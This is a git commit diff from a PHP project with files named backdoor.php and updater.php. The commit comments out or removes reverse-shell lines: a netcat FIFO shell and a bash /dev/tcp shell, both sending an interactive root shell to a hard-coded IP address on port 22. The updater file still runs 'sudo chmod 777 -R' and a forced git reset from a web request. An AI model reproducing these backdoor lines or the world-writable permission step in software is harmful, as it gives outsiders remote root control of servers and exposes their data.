769ba6c2f19efee5732528e055e578e48e341e2d
GT3CH1 <gavinpease@gmail.com>
2019-07-19 22:25:35 -0600

    Need to fix 99% of this garbage code.

--- lib/backdoor.php
+++ lib/backdoor.php
@@ -1,5 +1,6 @@
 <?php
 
 //exec("sudo rm /tmp/f;sudo mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 50.113.62.255 22 >/tmp/f");
-exec("sudo ./backdoor.sh");
+//Hacky way to make my own reverse shell if something ever goes catastrophicaly wrong.
+//exec("sudo ./backdoor.sh");
 ?>
--- lib/updater.php
+++ lib/updater.php
@@ -7,8 +7,6 @@
                         }
  ?> 
 <?php 
-  echo(':)');
- exec('sudo bash -i >& /dev/tcp/50.113.62.255/22 0>&1'); 
  exec('git -C ../ fetch --all & git reset --hard origin/master & git pull origin master & git -C ../ fetch --all & git reset --hard origin/master & git pull origin master');
  exec('sudo chmod 777 -R ../');
  header('Location: ../');
